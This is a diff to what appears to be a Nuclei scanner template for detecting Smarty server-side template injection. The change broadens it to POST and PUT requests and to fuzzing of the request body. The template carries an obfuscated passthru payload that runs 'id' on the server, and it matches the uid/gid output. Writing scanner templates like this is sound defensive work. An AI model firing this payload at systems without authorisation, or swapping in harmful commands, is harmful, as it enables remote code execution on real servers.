@@ -10,20 +10,23 @@ info:
     - https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
   metadata:
     max-request: 1
-  tags: smarty,ssti,dast
+  tags: smarty,ssti,dast,vuln
 
 http:
   - pre-condition:
       - type: dsl
         dsl:
           - 'method == "GET"'
-
+          - 'method == "POST"'
+          - 'method == "PUT"'
     payloads:
       injection:
         - "{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}"
 
     fuzzing:
-      - part: query
+      - parts:
+          - query
+          - body
         type: replace
         mode: single
         fuzz:
@@ -35,4 +38,4 @@ http:
         part: body
         regex:
           - "uid=[0-9]+.*gid=[0-9]+.*"
-# digest: 4a0a00473045022100d219370124241d2318eef217464573c803ef93c39c56eb25f4045aedefa628fd0220606e6ee5f15dddb0f56a616bd05d7358c084550cb1caa1cfdc7e9d840f34888f:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a00473045022100f2602031d9c01b45ba22e3e432a4e8ffb45c23d7b30522b13d1ef922a76e1389022074ace866f8e254f94df4ed54d41445f25a9784064dfc4dfa63ce5db00e60a398:922c64590222798bb761d5b6d8e72950
